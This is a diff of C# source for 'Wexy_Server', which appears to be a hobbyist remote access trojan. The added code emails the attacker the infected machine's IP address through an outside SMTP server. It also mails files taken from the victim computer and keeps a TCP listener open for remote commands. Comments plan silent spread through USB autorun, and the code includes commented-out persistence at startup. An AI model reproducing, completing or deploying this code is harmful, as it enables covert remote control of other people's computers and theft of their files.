@@ -145,8 +145,24 @@ namespace Wexy_Server
         }
 
         #region Commands
-
         // - ALMOST OK - 
+        public static string getLocalIP()
+        {
+            IPHostEntry host;
+            string localIP = "";
+            host = Dns.GetHostEntry(Dns.GetHostName());
+            foreach (IPAddress ip in host.AddressList)
+            {
+                if (ip.AddressFamily == AddressFamily.InterNetwork)
+                {
+                    localIP = ip.ToString();
+                    break;
+                }
+            }
+            return localIP;
+        } 
+
+        // - ALMOST OK - [NOT TESTED YET] 
         public static void KillWexy()
         {
             //RemoveFromStartup();
@@ -237,7 +253,7 @@ namespace Wexy_Server
             
         }
 
-        // - ALMOST OK - It doesn't display the first file and the last ones , only a few files..
+        // - ALMOST OK - 
         public static void ListFiles(string location)
         {
             string files = "";
@@ -325,17 +341,37 @@ namespace Wexy_Server
                 msg.Attachments.Add(objAttachment);
                 msg.Subject = "New file !";
                 msg.Body = "A new file was downloaded from the remote computer";
-
                 client.Send(msg);
-            }
-            catch //Could not send the mail(may be disconnected from the internet), so we close the application , it will start again on startup.
-            {
-                //Environment.Exit(0);
-                string response = "An error has occured while trying to send the mail";
+                string response = "The file was successfully sent to " + to;
                 byte[] Packet = Encoding.ASCII.GetBytes(response);
                 Writer.Write(Packet, 0, Packet.Length);
                 Writer.Flush();
             }
+            catch(Exception error)
+            {
+                string response = "An error has occured while trying to send the mail\nerror : "+error.Message;
+                byte[] Packet = Encoding.ASCII.GetBytes(response);
+                Writer.Write(Packet, 0, Packet.Length);
+                Writer.Flush();
+            }
+        }
+
+        // - OK -
+        public static void alertAttacker()
+        {
+            //Configure the stmp client
+            SmtpClient client = new SmtpClient("smtp.live.com");
+            client.Port = 587;
+            client.EnableSsl = true;
+            client.Timeout = 100000;
+            client.DeliveryMethod = SmtpDeliveryMethod.Network;
+            client.Credentials = new System.Net.NetworkCredential("mail", "password");
+            MailMessage msg = new MailMessage();
+            msg.To.Add("other_mail");
+            msg.From = new MailAddress("mail");
+            msg.Subject = "Wexy is alive !";
+            msg.Body = "The server is alive at " + getLocalIP();
+            client.Send(msg);
         }
 
         // - OK -
@@ -395,15 +431,16 @@ namespace Wexy_Server
 
         static void Main(string[] args)
         {
+            //How can I get it to work online ? :'(
             //Deploiement idée :
             //Clé usb avec un autorun , lorsqu'elle est branchée sur un pc , la clé va copier l'executable sur le système et executer l'application
             //Egalement , faudrait qu'elle me donne l'adresse IP de la machine dans la clé usb.
 
-            //addToStarup();
-            listenner = new TcpListener(IPAddress.Any, 1000);
-            //listenner = new TcpListener(IpAdress.Parse("external_ip", 2000); <- not working , gotta find another way for it to work online
+            //addToStartup();
+            alertAttacker();
+            listenner = new TcpListener(IPAddress.Any, 2000);
             listenner.Start();
-
+            Console.WriteLine(getLocalIP());
             for (int i = 0; i < 10; i++) // < - not the best way
             {
                 client = listenner.AcceptTcpClient();
